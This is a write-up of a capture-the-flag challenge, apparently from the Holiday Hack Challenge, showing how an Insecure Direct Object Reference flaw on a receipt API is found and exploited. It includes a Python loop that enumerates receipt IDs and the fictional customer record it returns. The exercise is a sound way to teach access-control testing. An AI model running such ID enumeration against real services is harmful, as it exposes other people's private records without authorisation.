+++
date = '2025-12-23T15:59:59+01:00'
draft = false
title = 'Idorable Bistro'
weight = 3
+++

![Kyle Parrish](/images/act2/joshwright-avatar.gif)

## Objective

| Difficulty | Description |
| ---------- | ----------- |
| 2/5 | Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome? |

## Josh Wright mission statement

> I'm a teetotling hacker.
> 
> I sleep about 4 hours a night.
> 
> Photography is my hobby, but the anachronistic sort: before 1900.
> 
> Teaching people how to hack and protect systems is my passion.
>
> ----
>
> I need your help with something urgent.
> 
> A gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.
> 
> Based on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.
>
> I was...[at a talk recently](https://www.youtube.com/watch?v=hzrhtHrhwno)...and learned some interesting things about some of these payment systems. Let's use that receipt to dig deeper and unmask this gnome's true identity.
> 
> ----
> 
> Did you see that receipt outside the door?

## Idorable Bistro

This objective focuses on identifying and exploiting an Insecure Direct Object Reference (IDOR) vulnerability in a web application. By interacting with backend endpoints and manipulating object identifiers, the challenge illustrates how insufficient authorization checks can expose sensitive data or functionality. It reinforces the importance of validating access controls server-side rather than relying on client-side assumptions.

Josh mentioned that there was a receipt outside the door. I went outside and to the right of the building and found this item: 

![Crumpled receipt](/images/act2/act2-idorable-1.png)

Parsing the QR I found out that it leads to `https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2`:

![Parsing QR](/images/act2/act2-idorable-2.png)

Upon visiting we are presented with the following webpage:

![Receipt page](/images/act2/act2-idorable-3.png)

Upon inspecting the HTML code we find something interesting in a Javascript: 

![Interesting Javascript](/images/act2/act2-idorable-4.png)

We find that the current receipt ID is `103` and that the real endpoint is `/api/receipt?id=${id}`, which takes an `id` parameter. Toying with this I found a lower boundary of `100` and an upper boundary of `160` appropiate. I could have narrowed further down, but I saw no point in doing that. 

Now, in order to traverse recipts in the range 100 to 160 I could do it manually, which would have taken too much time, or whip up a quick Python based bruteforcer. I went the Python route using this code: 

```python
import requests
from pprint import pprint

url = "https://its-idorable.holidayhackchallenge.com/api/receipt?id="

for i in range(100, 160, 1):
    r = requests.get(f"{url}{i}")

    if "frozen" in r.text.lower():
        pprint(r.json())
```

I knew the gnome asked for a frozen sushi, so I made the code look for any occurrence of the word 'frozen'. After a short while, I found the answer:

```
{'customer': 'Bartholomew Quibblefrost',
 'date': '2025-12-20',
 'id': 139,
 'items': [{'name': 'Frozen Roll (waitress improvised: sorbet, a hint of dry '
                    'ice)',
            'price': 19.0}],
 'note': 'Insisted on increasingly bizarre rolls and demanded one be served '
         "frozen. The waitress invented a 'Frozen Roll' on the spot with "
         'sorbet and a puff of theatrical smoke. He nodded solemnly and asked '
         'if we could make these in bulk.',
 'paid': True,
 'table': 14,
 'total': 19.0}
```

The gnomes name is `Bartholomew Quibblefrost`

IDOR vulnerabilities often hide in plain sight and require an understanding of how applications map user actions to backend objects.

## Josh Wright closing words

After solving, Josh says:

> Excellent work exploiting that IDOR vulnerability - textbook execution.
> 
> Now we know exactly which gnome tried to pass itself off as a sushi connoisseur. Frozen rolls... honestly, what's next?